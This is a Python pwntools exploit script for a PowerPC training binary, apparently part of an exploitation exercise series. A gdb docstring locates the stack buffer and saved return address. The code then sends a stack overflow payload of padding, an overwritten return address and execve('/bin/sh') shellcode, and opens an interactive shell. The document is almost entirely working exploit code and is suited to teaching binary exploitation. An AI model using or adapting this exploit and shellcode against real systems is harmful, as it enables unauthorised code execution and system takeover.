#!/usr/bin/python

"""
(gdb) disassemble vulnerable 
Dump of assembler code for function vulnerable:
   0x1000054c <+0>:	stwu    r1,-144(r1)
...
   0x100005a8 <+92>:	lwz     r0,4(r11)
   0x100005ac <+96>:	mtlr    r0
   0x100005a8 <+100>:	lwz     r31,-4(r11)
   0x100005b4 <+104>:	mr      r1,r11
   0x100005b8 <+108>:	blr
End of assembler dump.
(gdb) b vulnerable 
Breakpoint 1 at 0x10000560: file src/04-shellcode-static.c, line 6.
(gdb) b *0x100005a8
Breakpoint 2 at 0x100005a8: file src/04-shellcode-static.c, line 14.
(gdb) c
Continuing.

Breakpoint 1, vulnerable () at src/04-shellcode-static.c:6
6		printf("> ");
(gdb) p &buffer[0]
$1 = 0xffffdd58 "\377\377\335", <incomplete sequence \370>
(gdb) c
Continuing.

Breakpoint 2, 0x100005a8 in vulnerable () at src/04-shellcode-static.c:14
14	}
(gdb) p/x $r11+4
$2 = 0xffffdde4
"""

import struct
import sys

from pwn import *

context(arch='powerpc', os='linux', endian='big', word_size=32)

binary_path = './bin/ppc/04-shellcode-static'

saved_pc_addr = 0xffffdde4
buffer_addr = 0xffffdd58

# Adapted from http://shell-storm.org/shellcode/files/shellcode-86.php
shellcode = \
	'\x7c\x3f\x0b\x78' + \
	'\x7c\xa5\x2a\x79' + \
	'\x42\x40\xff\xf9' + \
	'\x7f\x08\x02\xa6' + \
	'\x3b\x18\x01\x34' + \
	'\x98\xb8\xfe\xfb' + \
	'\x38\x78\xfe\xf4' + \
	'\x90\x61\xff\xf8' + \
	'\x38\x81\xff\xf8' + \
	'\x90\xa1\xff\xfc' + \
	'\x3b\xc0\x01\x60' + \
	'\x7f\xc0\x2e\x70' + \
	'\x44\x00\x00\x00' + \
	'/bin/shZ'

p = process(binary_path)
#p = gdb.debug([binary_path])

payload = ''
payload += 'a' * (saved_pc_addr - buffer_addr)
payload += p32(saved_pc_addr + 4)
payload += shellcode

p.readuntil('> ')
p.write(payload)
p.interactive()
